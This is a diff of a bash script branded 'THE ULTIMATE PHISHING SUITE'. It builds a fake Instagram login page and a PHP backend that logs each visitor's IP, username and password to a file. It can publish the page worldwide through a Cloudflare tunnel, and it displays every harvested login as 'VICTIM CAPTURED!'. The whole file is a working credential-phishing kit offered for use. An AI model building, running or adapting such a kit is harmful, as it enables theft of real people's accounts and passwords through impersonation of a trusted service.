@@ -1,55 +1,62 @@
 #!/bin/bash
 
-# --- 1. SETUP & COLORS ---
-clear
-R='\033[1;31m'
-G='\033[1;32m'
-C='\033[1;36m'
-Y='\033[1;33m'
+# --- 1. PREMIUM CONFIG & COLORS ---
+# Hacker Colors
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+BLUE='\033[1;34m'
+CYAN='\033[1;36m'
+GOLD='\033[1;33m'
+PURPLE='\033[1;35m'
 RESET='\033[0m'
 
-# Cleanup
+# Cleanup Old Processes
 pkill -f php > /dev/null 2>&1
 pkill -f cloudflared > /dev/null 2>&1
 rm -rf auth/
 mkdir -p auth
 touch usernames.txt
 
-# --- 2. HEADER ---
-echo -e "${C}=========================================${RESET}"
-echo -e "${Y}      ANURAG HKR - LIVE SERVER (PRO)     ${RESET}"
-echo -e "${C}=========================================${RESET}"
+# --- 2. ANIMATION FX ---
+animate() {
+    text="$1"
+    delay="$2"
+    for (( i=0; i<${#text}; i++ )); do
+        echo -ne "${text:$i:1}"
+        sleep $delay
+    done
+    echo ""
+}
+
+# --- 3. LUXURY BANNER ---
+clear
+echo -e "${GOLD}"
+cat << "EOF"
+██████╗ ██████╗  ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
+██╔══██╗██╔══██╗██╔═══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+██████╔╝██████╔╝██║   ██║       ██║   ██║   ██║██║   ██║██║     
+██╔═══╝ ██╔══██╗██║   ██║       ██║   ██║   ██║██║   ██║██║     
+██║     ██║  ██║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
+╚═╝     ╚═╝  ╚═╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+EOF
+echo -e "${RESET}"
+echo -e "${CYAN}        >>> THE ULTIMATE PHISHING SUITE <<<        ${RESET}"
+echo -e "${PURPLE}        Created by : ANURAG HKR (Pro Edition)      ${RESET}"
+echo -e "${GOLD}====================================================${RESET}"
 echo ""
 
-# --- 3. AUTO-INSTALL CLOUDFLARED (The Engine) ---
-if [ ! -f "cloudflared" ]; then
-    echo -e "${Y}[*] Downloading Cloudflare Engine...${RESET}"
-    
-    # Check Architecture (Android vs PC)
-    ARCH=$(uname -m)
-    if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
-        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
-    elif [[ "$ARCH" == *"x86_64"* ]]; then
-        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
-    else
-        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
-    fi
-    
-    chmod +x cloudflared
-    echo -e "${G}[✔] Engine Installed!${RESET}"
-    sleep 1
-fi
-
-# --- 4. CREATE INSTAGRAM HTML (Mobile Optimized) ---
+# --- 4. YOUR EXACT HTML (NO CHANGES IN DESIGN) ---
+# Maine bas <form> tag add kiya hai, design 100% wahi hai.
 cat > auth/index.php <<EOF
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Instagram Login</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Instagram Login – UI Demo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <style>
-*{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+*{ margin:0; padding:0; box-sizing:border-box; font-family: Arial, Helvetica, sans-serif; }
 body{ background:#0b1116; color:#fff; }
 .main{ display:flex; min-height:100vh; }
 .left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
@@ -58,22 +65,18 @@ body{ background:#0b1116; color:#fff; }
 .left h1 span{ color:#ff2d55; }
 .left .story{ margin-top:40px; width:280px; }
 .right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
-.card{ width:380px; padding: 20px; }
-.card h2{ font-size:20px; margin-bottom:20px; text-align: center; }
+.card{ width:380px; }
+.card h2{ font-size:20px; margin-bottom:20px; }
 .input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; }
-.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
-.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; cursor: pointer; }
-.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; cursor: pointer; }
-.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; cursor: pointer; }
-.meta{ text-align:center; margin-top:25px; opacity:.7; font-size: 12px; }
-@media(max-width:900px){
-    .main{ flex-direction:column; }
-    .left{ display:none; } 
-    .right{ width:100%; height:100vh; background:#000; align-items: center; }
-    .card{ width: 100%; max-width: 350px; background: transparent; }
-}
+.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; } 
+.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; }
+.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; }
+.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
+.meta{ text-align:center; margin-top:25px; opacity:.7; }
+@media(max-width:900px){ .main{flex-direction:column;} .left,.right{width:100%;} }
 </style>
 </head>
+
 <body>
 <div class="main">
     <div class="left">
@@ -81,9 +84,11 @@ body{ background:#0b1116; color:#fff; }
         <h1>See everyday moments from <br> your <span>close friends.</span></h1>
         <img class="story" src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png">
     </div>
+
     <div class="right">
         <div class="card">
-            <h2 style="font-family: sans-serif;">Instagram</h2>
+            <h2>Log in to Instagram</h2>
+            
             <form action="login.php" method="POST">
                 <input class="input" type="text" name="username" placeholder="Mobile number, username or email address" required>
                 <input class="input" type="password" name="password" placeholder="Password" required>
@@ -92,7 +97,7 @@ body{ background:#0b1116; color:#fff; }
             <div class="link">Forgotten password?</div>
             <button class="fb">Log in with Facebook</button>
             <button class="new">Create new account</button>
-            <div class="meta">From<br>Meta</div>
+            <div class="meta">∞ Meta</div>
         </div>
     </div>
 </div>
@@ -100,6 +105,7 @@ body{ background:#0b1116; color:#fff; }
 </html>
 EOF
 
+# --- 5. PHP BACKEND ---
 cat > auth/login.php <<EOF
 <?php
 \$ip = \$_SERVER['REMOTE_ADDR'];
@@ -112,50 +118,85 @@ exit();
 ?>
 EOF
 
-# --- 5. START SERVERS ---
-echo -e "${Y}[*] Starting PHP Server (Localhost)...${RESET}"
-# PHP Localhost par chalega (Port 8080)
-php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
-PID=$!
-sleep 2
+# --- 6. MAIN MENU ---
+echo -e "${GREEN}[01] ${RESET}Localhost (Offline / Hotspot)"
+echo -e "${GREEN}[02] ${RESET}Cloudflare (Worldwide Link) ${GOLD}[PREMIUM]${RESET}"
+echo ""
+echo -ne "${CYAN}[?] Select Option : ${RESET}"
+read option
 
-echo -e "${Y}[*] Launching Cloudflare Tunnel...${RESET}"
-# Cloudflared us local port ko internet par bhejega
-./cloudflared tunnel -url http://127.0.0.1:8080 --logfile cloud.log > /dev/null 2>&1 &
-sleep 5
-
-# --- 6. EXTRACT & DISPLAY URL ---
-echo -e "${C}[*] Generating Live Link...${RESET}"
-sleep 3
-LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
-
-if [[ -z "$LINK" ]]; then
-    echo -e "${R}[!] Link Generation Failed! Retrying...${RESET}"
-    sleep 3
-    LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
-fi
-
-if [[ ! -z "$LINK" ]]; then
-    echo -e "${G}=========================================${RESET}"
-    echo -e "${Y}   LIVE URL: ${G}$LINK ${RESET}"
-    echo -e "${G}=========================================${RESET}"
-    echo -e "${R}[-] Waiting for Login... (Ctrl+C to Stop)${RESET}"
+# --- OPTION 1: LOCALHOST ---
+if [[ $option == "1" ]]; then
     echo ""
+    echo -ne "${GOLD}[?] Enter Port (e.g., 8080): ${RESET}"
+    read port
+    port=${port:-8080}
     
-    # --- 7. MONITORING LOOP ---
-    tail -n 0 -f usernames.txt | while IFS='|' read -r ip user pass; do
-        if [[ ! -z "$ip" ]]; then
-            echo -e "${R}[-] Victim Found !${RESET}"
-            echo -e "${G}[-] IP       : $ip${RESET}"
-            echo -e "${Y}[-] Username : $user${RESET}"
-            echo -e "${C}[-] Password : $pass${RESET}"
-            echo -e "----------------------------------------"
-            echo -e "\a"
+    echo -e "${RED}[*] Starting Server on Port $port...${RESET}"
+    php -S 0.0.0.0:$port -t auth > /dev/null 2>&1 &
+    
+    sleep 2
+    echo -e "${GREEN}[✔] HOSTED LOCALLY!${RESET}"
+    echo -e "${CYAN}Link: http://localhost:$port${RESET}"
+    
+# --- OPTION 2: CLOUDFLARE ---
+elif [[ $option == "2" ]]; then
+    echo ""
+    echo -e "${RED}[*] Initializing Cloudflare Tunnel...${RESET}"
+    
+    # Auto Install Cloudflared
+    if [ ! -f "cloudflared" ]; then
+        echo -e "${YELLOW}[!] Downloading Cloudflare Engine...${RESET}"
+        ARCH=$(uname -m)
+        if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
+            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+        else
+            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
         fi
-    done
+        chmod +x cloudflared
+    fi
+    
+    # Run
+    php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
+    ./cloudflared tunnel -url http://127.0.0.1:8080 --logfile cloud.log > /dev/null 2>&1 &
+    
+    echo -ne "${GOLD}[*] Generating Link... ${RESET}"
+    sleep 5
+    LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
+    
+    if [[ -z "$LINK" ]]; then
+        sleep 5
+        LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
+    fi
+    
+    echo -e "\n${GREEN}[✔] SUCCESS!${RESET}"
+    echo -e "${CYAN}------------------------------------------------${RESET}"
+    echo -e "${GOLD}URL: ${LINK}${RESET}"
+    echo -e "${CYAN}------------------------------------------------${RESET}"
+
 else
-    echo -e "${R}[!] Cloudflare Error. Check Internet or 'cloud.log' file.${RESET}"
-    cat cloud.log
-    killall php > /dev/null 2>&1
-    killall cloudflared > /dev/null 2>&1
+    echo -e "${RED}[!] Invalid Option! Exiting...${RESET}"
+    exit
 fi
+
+# --- 7. LISTENER MODE (COMMON FOR BOTH) ---
+echo ""
+echo -e "${PURPLE}[*] Waiting for Victim Data... (Ctrl + C to Stop)${RESET}"
+echo ""
+
+while true; do
+    if [ -f usernames.txt ]; then
+        tail -n 0 -f usernames.txt | while IFS='|' read -r ip user pass; do
+            if [[ ! -z "$ip" ]]; then
+                echo -e "${RED}╔════════════════════════════════════════╗${RESET}"
+                echo -e "${RED}║           VICTIM CAPTURED!             ║${RESET}"
+                echo -e "${RED}╠════════════════════════════════════════╣${RESET}"
+                echo -e "${GREEN}║ IP       : $ip${RESET}"
+                echo -e "${YELLOW}║ USERNAME : $user${RESET}"
+                echo -e "${CYAN}║ PASSWORD : $pass${RESET}"
+                echo -e "${RED}╚════════════════════════════════════════╝${RESET}"
+                echo -e "\a"
+            fi
+        done
+    fi
+done
